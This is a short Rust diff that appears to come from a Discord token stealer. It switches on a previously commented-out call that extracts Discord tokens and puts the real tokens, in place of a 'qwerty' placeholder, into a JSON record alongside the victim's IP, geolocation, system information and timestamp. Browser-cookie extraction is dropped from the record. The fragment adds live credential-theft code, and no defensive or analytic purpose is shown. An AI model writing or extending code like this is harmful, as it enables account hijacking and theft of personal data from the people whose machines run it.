@@ -44,8 +44,7 @@ async fn main() {
 
     let mut entries = Vec::new();
 
-    //let tokens = extractor.extract_discord_tokens();
-    //let browser_cookies = extractor.extract_browser_data();
+    let tokens = extractor.extract_discord_tokens();
     let sys_info = get_system_info();
     let ts = get_timestamp();
     let location = match get_geolocation(&ip).await {
@@ -57,10 +56,9 @@ async fn main() {
     let data = json!({
         "ip": ip,
         "location": location,
-        "tokens": ["qwerty"],//tokens,
+        "tokens":tokens,
         "system_info": sys_info,
-        "timestamp": ts,
-        //"browser_cookies": browser_cookies,
+        "timestamp": ts
     });
     entries.push(data);
 
